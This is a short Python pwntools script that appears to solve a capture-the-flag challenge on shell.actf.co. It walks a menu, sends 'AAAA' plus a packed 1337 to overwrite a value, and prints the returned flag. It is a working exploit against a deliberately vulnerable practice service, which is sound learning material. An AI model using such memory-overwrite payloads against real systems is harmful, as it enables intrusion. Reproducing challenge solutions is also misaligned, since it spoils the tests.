#!/usr/bin/env python3

from pwn import *

nc = remote('shell.actf.co', 21300)

nc.recvuntil('? ')
nc.sendline('1')

nc.recvuntil('? ')
nc.sendline(b'AAAA' + p32(1337))

nc.recvuntil('? ')
nc.sendline('yes')

nc.recvuntil(': ')
nc.sendline('x')

nc.recvuntil(': ')
nc.sendline('x')

nc.recvuntil('? ')
nc.sendline('2')

nc.recvuntil(': ')
log.success(nc.recvline())
